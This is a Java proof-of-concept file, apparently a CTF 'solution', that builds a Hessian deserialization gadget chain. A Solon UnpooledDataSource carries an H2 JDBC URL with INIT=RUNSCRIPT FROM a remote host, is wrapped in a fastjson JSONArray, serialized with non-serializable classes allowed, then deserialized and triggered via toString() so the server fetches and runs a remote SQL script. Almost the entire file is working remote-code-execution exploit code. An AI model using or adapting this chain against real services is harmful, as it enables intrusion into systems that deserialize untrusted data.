package solution;

import com.alibaba.fastjson.JSONArray;
import com.caucho.hessian.io.Hessian2Input;
import com.caucho.hessian.io.Hessian2Output;
import com.caucho.hessian.io.SerializerFactory;
import org.noear.solon.data.util.UnpooledDataSource;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.Serializable;
import java.sql.SQLException;
import java.util.Properties;

public class Poc {
    public static void main(String[] args) throws Exception {
//        Properties properties = new Properties();
//        properties.setProperty("url", "jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://127.0.0.1:7777/h2.sql'");
//        properties.setProperty("driver", "org.h2.Driver");
//        properties.setProperty("username", "any");
//        properties.setProperty("password", "any");
//        UnpooledDataSource unpooledDataSource = new UnpooledDataSource(properties);
//        unpooledDataSource.getConnection();

        //通过构造函数直接得到unpooledDataSource在序列化时会报错，但是通过Unsafe先创建空壳对象，再赋值就可以了，不知道为什么
        Object unpooledDataSource = Tools.getObjectByUnsafe(UnpooledDataSource.class);
        Tools.setFieldValue(unpooledDataSource, "url", "jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://127.0.0.1:7777/h2.sql'");
        Tools.setFieldValue(unpooledDataSource, "driverClassName", "org.h2.Driver");

        JSONArray jsonArray = new JSONArray();
        jsonArray.add(unpooledDataSource);

        byte[] ser = ser(jsonArray);

        Object deser = deser(ser);

        deser.toString();


    }

    public static byte[] ser(Object obj) throws SQLException, IOException, IllegalAccessException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        Hessian2Output hessian2Output = new Hessian2Output(baos);
        Tools.setFieldValue(hessian2Output, "_serializerFactory", new SerializerFactory());
        hessian2Output.getSerializerFactory().setAllowNonSerializable(true);
        hessian2Output.writeObject(obj);
        hessian2Output.close();
        return baos.toByteArray();
    }

    public static Object deser(byte[] bytes) throws SQLException, IOException {
        ByteArrayInputStream bais = new ByteArrayInputStream(bytes);
        Hessian2Input hessian2Input = new Hessian2Input(bais);
        Object o = hessian2Input.readObject();
        hessian2Input.close();
        return o;
    }
}
